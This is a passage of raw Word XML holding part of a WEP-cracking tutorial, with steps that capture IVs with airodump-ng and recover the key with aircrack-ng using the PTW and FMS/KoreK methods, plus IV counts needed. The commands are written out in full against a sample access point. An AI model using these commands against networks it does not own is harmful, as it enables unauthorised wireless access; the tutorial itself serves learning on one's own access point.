          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68701665" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="046A079C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 5 - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B2AC42"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The purpose of this step is to obtain the WEP key from the IVs gathered in the previous steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B874FD8"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Note: For learning purposes, you should use a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>64 bit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> WEP key on your AP to speed up the cracking process. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">If this is the case, then </w:t>
      </w:r>
      <w:r w:rsidRPr="00037A0F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>you can include ”-n 64” to limit the checking of keys to 64 bits</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="210EF2A7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="557FBAB2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00B64689" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Two methods will be shown. It is recommended you try both for learning purposes. By trying both methods, you will see quickly the PTW method successfully determines the WEP key compared to the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method. As a reminder, the PTW method only works successfully with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> request/reply packets. Since this tutorial covers injection of ARP request packets, you can properly use this method. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The other requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the ”--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B64689">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202A2A30"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Start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA14005" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2121A55C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002D638E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D16DFA" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5774C219"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35470E5A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 selects the one access point we are interested in. This is optional since when we originally captured the data, we applied a filter to only capture data for this one AP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FE614D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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output</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all files starting with “output” and ending in ”.cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E768D8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46ADDDD8"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To also use the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method, start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17247ADE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D8A507E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -K -b 00:14:6C:7E:40:80 output*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3ED44D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6388C7"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34832F68" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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-K invokes the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE7F07" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 Access Point mac address. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521BE5A4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>output</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all files starting with “output” and ending in ”.cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1345A3F7"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If you are using 1.0-rc1, add the option ”-K” for the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>KoreK</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack. (1.0-rc1 defaults to PTW.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AFF6F8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A289CC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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You will need approximately 250,000 IVs for 64 bit and </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248D1AC6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5448D23B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1,500,000 IVs for 128 bit keys.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B5F309" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>If you are using the PTW attack, then you will need about 20,000 packets for 64-bit and 40,000 to 85,000 packets for 128 bit.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> These are very approximate and there are many variables as to how many IVs you actually need to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129AA404" w14:textId="31E18B71" w:rsidR="002B0795" w:rsidRPr="000C668B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8C47F6" w14:textId="34AF3310" w:rsidR="002B0795" w:rsidRPr="000C668B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E237EEF" w14:textId="77777777" w:rsidR="007B0476" w:rsidRDefault="007B0476" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
